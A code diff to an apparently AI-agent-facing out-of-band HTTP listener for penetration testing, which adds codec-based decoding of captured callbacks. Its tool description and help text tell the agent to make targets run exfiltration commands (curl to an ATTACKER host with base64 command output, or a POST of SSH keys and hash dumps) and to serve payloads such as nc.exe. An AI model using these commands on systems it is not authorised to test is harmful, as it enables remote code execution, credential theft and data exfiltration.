@@ -21,27 +21,61 @@ _serve_dir:        str  = ""     # directory of payloads to serve, if any
 _MAX_BODY = 8 * 1024 * 1024
 
 
-def _try_b64_text(seg: str) -> str:
-    """Decode `seg` if it is base64 (how blind RCE exfiltrates output:
-    curl http://attacker/$(cmd|base64), or a base64 POST body). Empty if not."""
-    seg = (seg or "").strip()
-    if len(seg) < 4:
-        return ""
-    for fn in (base64.urlsafe_b64decode, base64.b64decode):
-        try:
-            pad = seg + "=" * (-len(seg) % 4)
-            out = fn(pad).decode("utf-8", errors="replace")
-            # Heuristic: mostly printable → treat as decoded exfil
-            if out and sum(c.isprintable() or c in "\r\n\t" for c in out) / len(out) > 0.8:
-                return out
-        except Exception:
-            continue
-    return ""
+# Deterministic decoders. The LLM decides WHICH one applies (it can see the raw
+# capture first and recognize base64/hex/gzip/…); the tool only executes the codec
+# it was told to — it never guesses. This is why the listener stores raw and decodes
+# at read time: no heuristic can mistake a plain `id` path for base64 anymore.
+DECODERS = ("base64", "base64url", "base32", "hex", "url", "gzip", "zlib", "rot13")
 
 
-def _try_b64_decode(path: str) -> str:
-    """Decode a base64 last-path-segment (URL-path exfil)."""
-    return _try_b64_text(path.strip("/").split("/")[-1].split("?")[0])
+def _bytes_to_view(raw: bytes) -> str:
+    """Render decoded bytes: text if it's valid UTF-8, else a hex dump with a marker
+    so binary output (e.g. gunzip of an ELF) is obvious rather than mojibake."""
+    text = raw.decode("utf-8", errors="strict") if _is_utf8(raw) else ""
+    if text:
+        return text
+    return f"<binary {len(raw)} bytes> hex={raw.hex()}"
+
+
+def _is_utf8(raw: bytes) -> bool:
+    try:
+        raw.decode("utf-8", errors="strict")
+        return True
+    except UnicodeDecodeError:
+        return False
+
+
+def _decode_blob(data: str, mode: str) -> str:
+    """Apply ONE codec the LLM named to `data`. Raises ValueError on a bad codec or a
+    decode failure so `check` can report it honestly (no silent fallback to garbage)."""
+    s = (data or "").strip()
+    if mode in ("", "raw"):
+        return data
+    import binascii, codecs, gzip as _gzip, urllib.parse, zlib
+    try:
+        if mode == "base64":
+            return _bytes_to_view(base64.b64decode(s + "=" * (-len(s) % 4)))
+        if mode == "base64url":
+            return _bytes_to_view(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)))
+        if mode == "base32":
+            return _bytes_to_view(base64.b32decode(s + "=" * (-len(s) % 8)))
+        if mode == "hex":
+            return _bytes_to_view(bytes.fromhex(s.replace(":", "").replace(" ", "")))
+        if mode == "url":
+            return urllib.parse.unquote(data)
+        if mode == "gzip":
+            return _bytes_to_view(_gzip.decompress(base64.b64decode(s + "=" * (-len(s) % 4))))
+        if mode == "zlib":
+            return _bytes_to_view(zlib.decompress(base64.b64decode(s + "=" * (-len(s) % 4))))
+        if mode == "rot13":
+            return codecs.decode(data, "rot13")
+    except (binascii.Error, ValueError, OSError, zlib.error) as e:
+        raise ValueError(f"{mode} decode failed: {e}")
+    raise ValueError(f"unknown decode mode '{mode}'; use one of: {', '.join(DECODERS)}")
+
+
+def _last_path_segment(path: str) -> str:
+    return path.strip("/").split("/")[-1].split("?")[0]
 
 
 class _CallbackHandler(http.server.BaseHTTPRequestHandler):
@@ -85,21 +119,17 @@ class _CallbackHandler(http.server.BaseHTTPRequestHandler):
         if self._maybe_serve():
             return
         body = self._read_body()
+        # Store RAW only — never auto-decode at capture time. Decoding is applied at
+        # read time (action='check', decode=…) using the codec the LLM names, so a
+        # plain path like /id can never be mistaken for base64 and surfaced as garbage.
         entry = {
             "method":      self.command,
             "path":        self.path,
             "remote_addr": self.client_address[0],
             "headers":     dict(self.headers),
-            "decoded":     _try_b64_decode(self.path),
         }
         if body:
-            text = body.decode("utf-8", errors="replace")
-            entry["body"] = text
-            # If the body itself is base64 (e.g. `base64 key | curl --data-binary @-`),
-            # surface the decoded form too.
-            dec = _try_b64_text(text)
-            if dec and dec != text:
-                entry["body_decoded"] = dec
+            entry["body"] = body.decode("utf-8", errors="replace")
         _received.append(entry)
         self.send_response(200)
         self.end_headers()
@@ -139,6 +169,7 @@ def oob_listener(
     port: int = 8888,
     filename: str = "",
     content: str = "",
+    decode: str = "raw",
 ) -> dict:
     global _server, _serve_dir, _received
 
@@ -155,28 +186,46 @@ def oob_listener(
             "callback_url": f"http://{_listener_ip}:{_listener_port}/",
             "note": ("Use callback_url in SSRF/XXE/blind-injection payloads. For SHORT blind-RCE "
                      "output, have the target run e.g. curl http://"
-                     f"{_listener_ip}:{_listener_port}/$(id|base64 -w0) — the base64 path is "
-                     "auto-decoded into 'decoded'/'exfil' on action='check'. For a LARGE or whole-file "
+                     f"{_listener_ip}:{_listener_port}/$(id|base64 -w0). For a LARGE or whole-file "
                      "exfil (an SSH key, a hash dump, any output that keeps getting cut short in the "
                      "URL or your command channel), POST/PUT it in the request BODY instead — e.g. "
                      f"curl --data-binary @/path/to/file http://{_listener_ip}:{_listener_port}/ — "
                      "the full body comes back under 'bodies' on action='check' (never use the "
-                     "length-limited URL for a key/file)."),
+                     "length-limited URL for a key/file). action='check' returns RAW; if the callback "
+                     "is encoded (you'll see base64/hex/gzip in the raw), call check again with "
+                     "decode='base64' (or hex/base64url/gzip/zlib/url/rot13) to decode it."),
         }
 
     elif action == "check":
         hits = list(_received)
-        # 'exfil' = short URL-path output; 'bodies' = whole posted/put payloads (a key,
-        # a dump, any file too big for a URL). Decoded body preferred over raw.
-        bodies = [h.get("body_decoded") or h.get("body") for h in hits if h.get("body")]
-        return {
+        # 'bodies' = whole posted/put payloads (a key, a dump, any file too big for a
+        # URL). Always raw. 'received' carries each callback (path + headers + body).
+        bodies = [h.get("body") for h in hits if h.get("body")]
+        out = {
             "callback_fired": len(hits) > 0,
             "count":          len(hits),
             "received":       hits,
-            "exfil":          [h.get("decoded") for h in hits if h.get("decoded")],
             "bodies":         bodies,
             "callback_url":   f"http://{_listener_ip}:{_listener_port}/" if _listener_ip else "",
         }
+        # decode != raw → the LLM recognized an encoding in the raw capture and is
+        # asking the tool to apply that exact codec. We decode the body if present,
+        # else the last URL-path segment (where `$(cmd|base64)` exfil lands).
+        if decode and decode != "raw":
+            decoded, errors = [], []
+            for h in hits:
+                src = h.get("body") or _last_path_segment(h.get("path", ""))
+                if not src:
+                    continue
+                try:
+                    decoded.append(_decode_blob(src, decode))
+                except ValueError as e:
+                    errors.append(str(e))
+            out["decode"] = decode
+            out["decoded"] = decoded
+            if errors:
+                out["decode_errors"] = errors
+        return out
 
     elif action == "host":
         # Serve a payload file for the target to download (e.g. nc.exe, a script).
@@ -213,15 +262,17 @@ TOOL_DEFINITION = {
     "description": (
         "Out-of-band HTTP listener — for blind vulnerability detection AND blind-RCE output "
         "exfiltration. Start it for a callback URL to use in SSRF/XXE/blind-injection payloads. For "
-        "SHORT blind command output, have the target run `curl http://ATTACKER:PORT/$(cmd|base64 -w0)`; "
-        "action='check' returns each callback with the base64 path auto-decoded in 'decoded'/'exfil'. "
+        "SHORT blind command output, have the target run `curl http://ATTACKER:PORT/$(cmd|base64 -w0)`. "
         "For a LARGE or whole-file exfil (an SSH key, a password/hash dump, anything that keeps getting "
         "cut short in a URL or a lossy command-readback channel), have the target POST/PUT the data in "
         "the request BODY — `curl --data-binary @/path/file http://ATTACKER:PORT/` — and action='check' "
         "returns the complete payload under 'bodies' (the URL path is length-limited; the body is not). "
-        "action='host' serves a payload file (filename+content) so the target can download it. Reads "
-        "the attacker IP from the local interface (tun0 for VPN, eth0 for direct). Actions: start, "
-        "check, host, stop."
+        "action='check' returns the RAW capture — it never guesses an encoding. If a callback is encoded "
+        "(you'll see base64/hex/gzip in the raw body or URL path), call check again with the 'decode' "
+        "argument set to the codec you recognize and the tool decodes it deterministically (into "
+        "'decoded'). action='host' serves a payload file (filename+content) so the target can download "
+        "it. Reads the attacker IP from the local interface (tun0 for VPN, eth0 for direct). Actions: "
+        "start, check, host, stop."
     ),
     "input_schema": {
         "type": "object",
@@ -246,6 +297,14 @@ TOOL_DEFINITION = {
             "content": {
                 "type": "string",
                 "description": "For action='host': the file content to serve.",
+            },
+            "decode": {
+                "type": "string",
+                "enum": ["raw", "base64", "base64url", "base32", "hex", "url", "gzip", "zlib", "rot13"],
+                "description": ("For action='check': decode each captured callback with this codec "
+                                "(default 'raw' = no decoding). Look at the raw capture first, then "
+                                "set this to the encoding you recognize. Decodes the request body if "
+                                "present, else the last URL-path segment."),
             },
         },
         "required": ["action"],
